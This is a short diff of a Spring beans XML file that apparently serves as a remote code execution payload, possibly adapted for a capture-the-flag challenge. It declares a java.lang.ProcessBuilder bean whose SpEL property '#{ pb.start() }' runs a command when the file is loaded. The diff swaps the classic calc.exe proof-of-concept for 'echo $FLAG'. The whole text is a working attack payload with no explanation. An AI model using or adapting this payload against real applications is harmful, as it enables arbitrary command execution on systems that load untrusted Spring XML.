@@ -5,7 +5,8 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="calc.exe" />
+     <constructor-arg value="echo" />
+     <constructor-arg value="$FLAG" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
